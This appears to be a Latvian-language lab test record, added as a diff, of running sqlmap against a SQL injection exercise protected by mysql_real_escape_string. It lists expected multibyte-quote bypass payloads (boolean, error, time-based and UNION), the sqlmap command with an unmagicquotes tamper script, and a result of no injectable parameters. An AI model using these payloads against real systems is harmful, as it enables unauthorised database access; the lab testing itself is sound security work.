@@ -1,0 +1,21 @@
+=================================================================================
+1. Īpašība: lai nevarētu injicēt pēdiņu, tiek lietota php funkcija “mysql-real-escape-string”.
+2. Nepiciešams tampering: jā, --tamper=unmagicquotes
+3. Sagaidāmais rezultāts: 
+3.1. boolean-based: ?username=test%bf%27 or 1=1 %23&password=test
+3.2. error-based: ?username=test%bf%27&password=test
+3.3. time-based: ?username=test%bf%27 or sleep(2) %23&password=test
+3.4. union: ?username=test%bf%27union select 1,2,3%23&password=test
+4. Reālais rezultāts: redzams zemāk
+5. Vidējais risinājuma ilgums: 5083951 nanosekundes
+6. Palaistā komanda
+sqlmap -u "http://192.168.17.134/sqlinjection/example9/?username=test&password=test" -p username,password --risk=3 --level=5 --tamper=unmagicquotes
+
+7. Jautājumi, kurus uzdeva SQLMap
+7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+7.2. injection not exploitable with NULL values. Do you want to try with a random integer vavlue for option '--union-char'? [Y/n] y
+7.3. it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
+=================================================================================
+false positive or unexploitable injection point detected
+
+all tested parameters do not appear to be injectable.
